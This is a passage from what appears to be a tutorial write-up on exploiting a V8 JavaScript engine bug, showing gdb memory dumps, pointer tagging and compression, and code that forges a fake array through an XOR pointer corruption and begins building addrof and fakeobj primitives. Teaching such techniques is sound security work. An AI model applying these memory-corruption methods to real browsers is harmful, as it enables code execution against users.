 - constructor: 0x0a38001cae09 &lt;JSFunction Array (sfi = 0xa380002b2f9)&gt;
 - dependent code: 0x0a3800000735 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
 - construction counter: 0
<!---->
[1.1, 2.2, 3.3]
<span class="termCodeW">d8&gt; ^Z</span> <span class="termCodeComm">&lt;-- suspend d8 (ctrl+z) to get to gdb</span>
Thread 1 "d8" received signal SIGTSTP, Stopped (user).
0x00007ffff7da000a in read () from /usr/lib/libc.so.6
<span class="termCodeW">(gdb) x/8xg 0xa3800042be9-1</span> <span class="termCodeComm">&lt;-- examine the array's address</span>
0xa3800042be8:	0x00000725001cb7c5	0x0000000600042bc9
0xa3800042bf8:	0x00bab9320000010d	0x7566280a00000adc
0xa3800042c08:	0x29286e6f6974636e	0x20657375220a7b20
0xa3800042c18:	0x3b22746369727473	0x6d2041202f2f0a0a
<span class="termCodeW">(gdb)</span></div>

In this example I made an array, used DebugPrint to see it's address, and then used gdb's `x/8xg`[^3] command to see the memory around that address. Going forward I'll be cleaning up the examples shown in the blog post, but this is essentially how you can follow along at home.

You'll notice I subtracted 1 from the memory address before viewing it - that's because of tagged pointers! In a `PACKED_ELEMENTS` array (and many other V8 structures), SMIs (SMall Integers) that end with a 0 bit (even) are shifted and stored directly, but everything ending with a 1 bit (odd) gets interpreted as a pointer, so a pointer to `0x1000` gets stored as `0x1001`. Because of this, we have to subtract 1 from all tagged pointers before checking out their address.

But let's try to understand what the gdb output above means:

<div class="jsMem">
	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
	<div class="jsMemDbg">DebugPrint: <span class="jsMemVar1">0xa3800042be9</span>: [JSArray]
- map: <span class="jsMemVar3">0x0a38001cb7c5</span> &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
- prototype: 0x0a38001cb11d &lt;JSArray[0]&gt;
- elements: <span class="jsMemVar5">0x0a3800042bc9</span> &lt;<span class="jsMemVar7">FixedDoubleArray</span>[<span class="jsMemVar6">3</span>]&gt; [PACKED_DOUBLE_ELEMENTS]
- length: <span class="jsMemVar4">3</span>
- properties: <span class="jsMemVar2">0x0a3800000725</span> &lt;FixedArray[0]&gt;
- All own properties (excluding elements): {
   0xa3800000d99: [String] in ReadOnlySpace: #length: 0x0a3800025f85 &lt;AccessorInfo name= 0x0a3800000d99 &lt;String[6]: #length&gt;, data= 0x0a3800000069 &lt;undefined&gt&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
}
- elements: <span class="jsMemVar5">0x0a3800042bc9</span> &lt;FixedDoubleArray[<span class="jsMemVar6">3</span>]&gt; {
          0: <span class="jsMemVar8">1.1</span>
          1: <span class="jsMemVar9">2.2</span>
          2: <span class="jsMemVar10">3.3</span>
}</div>
<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
	<div class="jsMemHex">0xa3800042bb8: 0x00000004000005e5<span class="under430"><br>0xa3800042bc0:</span> 0x001d3377020801a4
<span class="jsMemVar5">0xa3800042bc8</span>: 0x<span class="jsMemVar6">00000006</span><span class="jsMemVar7">000008a9</span><span class="under430"><br>0xa3800042bd0:</span> 0x<span class="jsMemVar8">3ff199999999999a</span>
0xa3800042bd8: 0x<span class="jsMemVar9">400199999999999a</span><span class="under430"><br>0xa3800042be0:</span> 0x<span class="jsMemVar10">400a666666666666</span>
<span class="jsMemVar1">0xa3800042be8</span>: 0x<span class="jsMemVar2">00000725</span><span class="jsMemVar3">001cb7c5</span><span class="under430"><br>0xa3800042bf0:</span> 0x<span class="jsMemVar4">00000006</span><span class="jsMemVar5">00042bc9</span>
0xa3800042bf8: 0x00bab9320000010d<span class="under430"><br>0xa3800042c00:</span> 0x7566280a00000adc
</div>
<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
<div class="jsMemLegend">
The array is at <span class="jsMemVar1">0xa3800042be8</span>, its <span class="jsMemVar2">properties list</span> is empty, it's a <code><span class="jsMemVar3">PACKED_DOUBLE_ELEMENTS</span></code> array with a <span class="jsMemVar4">length of 3</span><sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref" style="color:#95dcff">4</a></sup> at <span class="jsMemVar5">0xa3800042bc9</span>. At that address we find a <span class="jsMemVar7">FixedDoubleArray</span> with a <span class="jsMemVar6">length of 3 (again)</span> and the doubles <span class="jsMemVar8">1.1</span>, <span class="jsMemVar9">2.2</span>, and <span class="jsMemVar10">3.3</span>.
</div>
</div>

<span style="display: none">[^4]</span><!-- hack to force my markdown engine add the footnote -->

Try <span class="fineText">hovering over</span><span class="coarseText">tapping on</span> the text and stuff above. You'll see what the memory values mean and how they're represented in the %DebugPrint output.

You may be wondering why the memory only contains half the address - `0xa3800042bc8` is stored as `0x00042bc9` for example. This is [V8's pointer compression](https://v8.dev/blog/pointer-compression) and for our purposes all it does is make pointers be just the lower 32 bits of an address.

Pretty cool, let's see what happens if we put an array inside of another array:

<!-- arr = [1.1, 2.2, 3.3]; arr2 = [arr] -->
<div class="jsConsole" style="margin-bottom: 4px">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr2</span> = [<span class="jsConVar">arr</span>]</div>
</div>
<div class="jsMem">
	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
	<div class="jsMemDbg">DebugPrint: 0xa3800044a31: [JSArray]
 - map: 0x0a38001cb845 &lt;Map[16](PACKED_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x0a38001cb11d &lt;JSArray[0]&gt;
 - elements: 0x0a3800044a25 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]
 - length: 1
 - properties: 0x0a3800000725 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0xa3800000d99: [String] in ReadOnlySpace: #length: 0x0a3800025f85 &lt;AccessorInfo name= 0x0a3800000d99 &lt;String[6]: #length&gt;, data= 0x0a3800000069 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x0a3800044a25 &lt;FixedArray[1]&gt; {
           0: 0x0a3800042be9 &lt;JSArray[3]&gt;
 }</div>
<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
	<div class="jsMemHex">0xa3800044a10: 0x000005e5000449f5 0x1d1a6d7400000004
0xa3800044a20: 0x0000056d001d3fb7 0x00042be900000002
0xa3800044a30: 0x00000725001cb845 0x0000000200044a25
0xa3800044a40: 0x00000725001cb845 0x0000000200044b99</div>
<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
<div class="jsMemLegend">
	The PACKED_ELEMENTS array is at 0xa3800044a30, its 1 element is at 0xa3800044a24 in a FixedArray[1] and the element is a pointer to the previous array at 0xa3800042be8.
</div>
</div>

The memory order of the elements part here looks a little odd because it doesn't align with the 64-bit words and we're looking at [little endian](https://en.wikipedia.org/wiki/Endianness) memory. This is a bit counter-intuitive because instead of reading the offset value as `0x0000000011112222 0x3333444400000000` you have to read it as `0x3333444400000000 0x0000000011112222`.

<div class="over640"><span class="fineText">Here's a fun little widget to play around with the concept:

<div class="offsetDemo">
<div class="offsetDemoOverlay"><span>0000000000000000</span>00000000000000000000000000000000<span>0000000000000000</span><br><span>0000000000000000</span>0<span>00000000000000000</span></div>
<div class="offsetDemoLegend"> read bytes as:                <span style="width:0.5ch;display:inline-block"></span>|<br>  if offset by:                <span style="width:0.5ch;display:inline-block"></span>|</div>
<div class="offsetDemoNumbers">1111222233334444<span style="color:#AAA">0000000000000000</span>1111222233334444<br>0 1 2 3 4 5 6 7 8                 drag this -&gt;<span class="offsetDemoHandle"></span></div>
</div>
</span></div>


<style>
.offsetDemo {
	font-size: 16px;
	cursor: default;
	user-select: none;
	font-family: Menlo, Consolas, "Ubuntu Mono", monospace;
	line-height: 1em;
	width: 64ch;
	margin: 0 auto;
	border-radius: 4px;
	border: 1px solid black;
	overflow: hidden;
	position: relative;
	background: #282C34;
	color: #FFF;
}
.offsetDemoLegend {
	white-space: pre;
	color: var(--lyreGold);
	position: absolute;
	pointer-events: none;
}
.offsetDemoOverlay {
	color: #0000;
	position: absolute;
	height: 1em;
	pointer-events: none;
}
.offsetDemoOverlay > span {
	background: #282C34;
}
.offsetDemoHandle {
	background: var(--lyreGold);
	width: 1.5ch;
	height: 12px;
	margin: 2px 0.25ch;
	display: inline-block;
	vertical-align: middle;
	border-radius: 4px;
}
.offsetDemoNumbers {
	white-space: pre;
  overflow: hidden;
  resize: horizontal;
  height: 2.1em;
  width: 64ch;
  min-width: 48ch;
  max-width: 64ch;
  text-wrap: nowrap;
  text-align: right;
}
</style>

The array in our array is just stored as a pointer to that array! At the moment it is pointing at `0xa3800042be8` which has our double array, but if we XOR this pointer to a different address we can make it point to any array or object we want... even if it doesn't "actually" exist!

Let's try to make a new array appear out of thin air. To do that, we have to put something in the memory that *looks* like an array, and then use XOR to point a pointer to it. I'm going to reuse the header of our first array at `0xa3800042be8`, changing the memory addresses to match our new fake array.

<div class="jsMem">
<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
	<div class="jsMemHex"><span class="over430">0x??????????: 0x????????????????</span><span class="under430">0x??????????:</span> 0x<span class="jsMemVar6">00000100</span><span class="jsMemVar7">000008a9</span></span>
0x??????????: 0x<span class="jsMemVar2">00000725</span><span class="jsMemVar3">001cb7c5</span><span class="under430"><br>0x??????????:</span> 0x<span class="jsMemVar4">00000100</span><span class="jsMemVar5">00042bd1</span>
</div>
<div class="jsMemTitle">ENG<div class="jsMemSep"></div></div>
<div class="jsMemLegend">
Fake <code><span class="jsMemVar3">PACKED_DOUBLE_ELEMENTS</span></code> array with an <span class="jsMemVar2">empty properties list</span>, with <span class="jsMemVar4">128 elements</span> at <span class="jsMemVar5" style="text-wrap: nowrap">0x???00042bd0</span>. At that address we will have a <span class="jsMemVar7">FixedDoubleArray</span> with a <span class="jsMemVar6">length of 128</span>.
</div>
</div>

That looks like a pretty good fake! And the length of 128 elements is a bonus - letting us read and write far more than we should be able to. To put this fake array in the memory, we must first convert it into floats so we can use it within an array. There are many ways to do that, but the easiest method within JavaScript is to share the same **ArrayBuffer** between a **Float64Array** and a **BigUint64Array**.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">8</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">floatBuffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">Float64Array</span>(<span class="jsConVar">buffer</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">int64Buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">BigUint64Array</span>(<span class="jsConVar">buffer</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">i2f</span> = 
		(<span class="jsConIdx">i</span>) => {<span style="white-space: pre-wrap">
     <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i</span>;
     <span class="jsConKw">return</span> <span class="jsConVar0">floatBuffer</span>[<span class="jsConValIn">0</span>];
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">3.881131231533e-311</span></div>
</div>

Pretty easy! You'll notice I appended an `n` to our hex value - this is just to convert it to a [BigInt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt), which is required for the **BigUint64Array** but also gives us better accuracy in general[^5].

Let's put these values in the array from earlier:

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConFun">i2f</span>(<span class="jsConValIn">0x00000100000008a9n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>[<span class="jsConValIn">1</span>] = <span class="jsConFun">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span>[<span class="jsConValIn">2</span>] = <span class="jsConFun">i2f</span>(<span class="jsConValIn">0x0000010000042bd1n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">5.432309235825e-312</span>, <span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">5.432310575454e-312</span>]</i></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x00000100000008a9</span><br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x0000010000042bd1</span><br/>
</div>
	</details></div>
</div>

So our original real array starts at `0xa3800042be8`, and we have our cool new fake array in the memory at `0xa3800042bd8`, so what we can do now is put our *real array* in a third array with the evil getter trick, and then XOR the pointer to make it point to the fake array.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr3</span> = [<span class="jsConValIn">1.1</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">evil</span> = {<span style="white-space: pre-wrap">
     <span class="jsConFun">valueOf</span>: () => {
       <span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">arr</span>;
       <span class="jsConKw">const</span> <span class="jsConIdx">realArray</span> = <span class="jsConValIn">0xa3800042be8n</span>;
       <span class="jsConKw">const</span> <span class="jsConIdx">fakeArray</span> = <span class="jsConValIn">0xa3800042bd8n</span>;
       <span class="jsConKw">return</span> <span class="jsConVar">Number</span>(<span class="jsConVar">realArray</span> ^ <span class="jsConVar">fakeArray</span>);
     }
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr3</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">evil</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(128) [<span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">5.432310575454e-312</span>, <span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">1.27321098e-313</span>, <span class="jsConValOut">3.8055412126965747e-305</span>, <span class="jsConValOut">3.3267913058887005e+257</span>, <span class="jsConValOut">2.0317942745751732e-110</span>, <span class="jsConValOut">1.2799112976201688e-152</span>, <span class="jsConValOut">7.632660997817179e-24</span>, <span class="jsConValOut">4.48268017468496e+217</span>, <span class="jsConValOut">2.502521315148532e+262</span>, <span class="jsConValOut">8.764262388001722e+252</span>, <span class="jsConValOut">3.031075143147101e-152</span>, <span class="jsConValOut">5.328171041616219e+233</span>, <span class="jsConValOut">5.5199981093443586e+228</span>, <span class="jsConValOut">7.495112028514905e+247</span>, (112&nbsp;more)...]</i></summary>
<div style="padding-left: 24px">
<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x0000010000042bd1</span><br/>
<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
<span class="jsConIdx jsConB">3</span>: <span class="jsConValOut">0x0000000600042bc9</span><br/>
<span class="jsConIdx jsConB">4</span>: <span class="jsConValOut">0x00bab9320000010d</span><br/>
<span class="jsConIdx jsConB">5</span>: <span class="jsConValOut">0x7566280a00000adc</span><br/>
<span class="jsConIdx jsConB">6</span>: <span class="jsConValOut">0x29286e6f6974636e</span><br/>
<span class="jsConIdx jsConB">7</span>: <span class="jsConValOut">0x20657375220a7b20</span><br/>
<span class="jsConIdx jsConB">8</span>: <span class="jsConValOut">0x3b22746369727473</span><br/>
<span class="jsConIdx jsConB">9</span>: <span class="jsConValOut">0x6d2041202f2f0a0a</span><br/>
<span class="jsConIdx jsConB">10</span>: <span class="jsConValOut">0x76696e752065726f</span><br/>
<span class="jsConIdx jsConB">11</span>: <span class="jsConValOut">0x7473206c61737265</span><br/>
<span class="jsConIdx jsConB">12</span>: <span class="jsConValOut">0x20796669676e6972</span><br/>
<span class="jsConIdx jsConB">13</span>: <span class="jsConValOut">0x7075732074616874</span><br/>
<span class="jsConIdx jsConB">14</span>: <span class="jsConValOut">0x6f6d207374726f70</span><br/>
<span class="jsConIdx jsConB">15</span>: <span class="jsConValOut">0x7365707974206572</span><br/>
<span style="padding-left: 4px"><i>(112&nbsp;more)...</i><br/></span>
</div>
	</details></div>
</div>

Wow! That fake array of ours has lots of cool data that we didn't put there. Let's see what it looks like in the memory.

<div class="jsMem">
	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
	<div class="jsMemDbg">DebugPrint: <span class="jsMemVar0">0x25ec00042bd9</span>: [JSArray]
 - map: 0x25ec001cb7c5 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x25ec001cb11d &lt;JSArray[0]&gt;
 - elements: <span class="jsMemVar4">0x25ec00042bd1</span> &lt;FixedDoubleArray[128]&gt; [PACKED_DOUBLE_ELEMENTS]
 - length: <span class="jsMemVar3">128</span>
 - properties: 0x25ec00000725 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0x25ec00000d99: [String] in ReadOnlySpace: #length: 0x25ec00025f85 &lt;AccessorInfo name= 0x25ec00000d99 &lt;String[6]: #length&gt;, data= 0x25ec00000069 &lt;undefined&gt;&gt; (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: <span class="jsMemVar4">0x25ec00042bd1</span> &lt;FixedDoubleArray[128]&gt; {
           0: <span class="jsMemVar1 jsMemVar2">3.88113e-311</span>
           1: <span class="jsMemVar3 jsMemVar4">5.43231e-312</span>
           2: <span class="jsMemVar7">3.88113e-311</span>
           3: <span class="jsMemVar8">1.27321e-313</span>
           4: <span class="jsMemVar9">3.80554e-305</span>
           5: <span class="jsMemVar10">3.32679e+257</span>
           6: <span class="jsMemVar11">2.03179e-110</span>
           7: <span class="jsMemVar12">1.27991e-152</span>
           8: <span class="jsMemVar13">7.63266e-24</span>
           9: <span class="jsMemVar14">4.48268e+217</span>
          10: <span class="jsMemVar15">2.50252e+262</span>
          11: <span class="jsMemVar16">8.76426e+252</span>
          12: <span class="jsMemVar17">3.03108e-152</span>
          13: <span class="jsMemVar18">5.32817e+233</span>
          14: <span class="jsMemVar19">5.52e+228</span>
          15: <span class="jsMemVar20">7.49511e+247</span>
          ...
}</div>
<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
	<div class="jsMemHex">0x25ec00042bb8: 0x00000004000005e5 0x001d3377020801a4
<span class="jsMemVar4">0x25ec00042bc8</span>: 0x00000006000008a9 0x<span class="jsMemVar5">00000100</span><span class="jsMemVar6">000008a9</span>
<span class="jsMemVar0">0x25ec00042bd8</span>: 0x<span class="jsMemVar1">00000725</span><span class="jsMemVar2">001cb7c5</span> 0x<span class="jsMemVar4">00000100</span><span class="jsMemVar3">00042bd1</span>
0x25ec00042be8: 0x<span class="jsMemVar7">00000725001cb7c5</span> 0x<span class="jsMemVar8">0000000600042bc9</span>
0x25ec00042bf8: 0x<span class="jsMemVar9">00bab9320000010d</span> 0x<span class="jsMemVar10">7566280a00000adc</span>
0x25ec00042c08: 0x<span class="jsMemVar11">29286e6f6974636e</span> 0x<span class="jsMemVar12">20657375220a7b20</span>
0x25ec00042c18: 0x<span class="jsMemVar13">3b22746369727473</span> 0x<span class="jsMemVar14">6d2041202f2f0a0a</span>
0x25ec00042c28: 0x<span class="jsMemVar15">76696e752065726f</span> 0x<span class="jsMemVar16">7473206c61737265</span>
0x25ec00042c38: 0x<span class="jsMemVar17">20796669676e6972</span> 0x<span class="jsMemVar18">7075732074616874</span>
0x25ec00042c48: 0x<span class="jsMemVar19">6f6d207374726f70</span> 0x<span class="jsMemVar20">7365707974206572</span></div>
</div>

That's so cool!! It really is just picking up the next 1024 bytes of memory as doubles, letting us see it all by just looking at the array. In fact, we can even see the <span class="jsMemVarExt7 jsMemVarExt8">original `arr` array's header</span> in elements <span class="jsMemVarExt7">2</span> and <span class="jsMemVarExt8">3</span>, let's try to read it out from within JavaScript. We'll want a function to turn floats back into hex, for that we can just create the reverse of the `i2f` function from earlier.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">f2i</span> = 
		(<span class="jsConIdx">f</span>) => {<span style="white-space: pre-wrap">
     <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">f</span>;
     <span class="jsConKw">return</span> <span class="jsConVar0">int64Buffer</span>[<span class="jsConValIn">0</span>];
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>][<span class="jsConValIn">2</span>]</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">3.881131231533e-311</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">f2i</span>(<span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>][<span class="jsConValIn">2</span>])</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">7855497066437n</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">f2i</span>(<span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>][<span class="jsConValIn">2</span>]).<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConStrOut">'725001cb7c5'</span> <span class="jsConNull">// 0x00000725001cb7c5</span></div>
</div>

Exciting! Let's overwrite `arr`'s header with some random stuff and see what happens.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(3) [<span class="jsConValOut">5.432309235825e-312</span>, <span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">5.432310575454e-312</span>]</i></summary>
<div style="padding-left: 24px">
	<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x00000100000008a9</span><br/>
	<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
	<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x0000010000042bd1</span><br/>
</div>
	</details></div>
<div class="jsConBorder"></div>
<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr3</span>[<span class="jsConValIn">0</span>][<span class="jsConValIn">2</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x1337133713371337n</span>)</div>
<div class="jsConBorder"></div>
<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">arr</span></div>
<div class="jsConBorder"></div>
<div class="jsConLine jsConTerm">Received signal 11 SEGV_ACCERR 0a381337133e
==== C stack trace ===============================
 [0x555557b9ea23]
 [0x555557b9e972]
 [0x7ffff7cdae20]
 [0x555556d3190b]
 [0x555557a12ff6]
[end of stack trace]
Segmentation fault (core dumped)</div>
</div>

Whoops, yeah... there's the rub. The memory we're playing with is rather fragile and randomly changing stuff around is going to end up with a crash.

We'll have to be a bit more careful going forward if we want to end up with anything more than a segmentation fault. And there's more to worry about later down the line because v8 also has a garbage collector that likes to swoop in every once in a while to rearrange the memory.

This is a good time to figure out a plan for getting our primitives cooked up though.

## Part 3: Cooking up some primitives

In JavaScript exploitation, a memory corruption is usually turned into the **addrof** and **fakeobj** primitives. **addrof** is a function that tells us the address of a JavaScript object, and **fakeobj** is a function that returns a pointer to a memory address to be interpreted as an object, similar to what we did to create our fake array earlier.

Let's take our research so far and wrap it up in a nice little script.

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConNull">// set up helper stuff</span>
<span class="jsConKw">const</span> <span class="jsConIdx">buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">8</span>);
<span class="jsConKw">const</span> <span class="jsConIdx">floatBuffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">Float64Array</span>(<span class="jsConVar">buffer</span>);
<span class="jsConKw">const</span> <span class="jsConIdx">int64Buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">BigUint64Array</span>(<span class="jsConVar">buffer</span>);
<!---->
<span class="jsConNull">// bigint to double</span>
<span class="jsConKw">function</span> <span class="jsConIdx">i2f</span>(<span class="jsConIdx">i</span>) {
  <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>];
}
<!---->
<span class="jsConNull">// double to bigint</span>
<span class="jsConKw">function</span> <span class="jsConIdx">f2i</span>(<span class="jsConIdx">f</span>) {
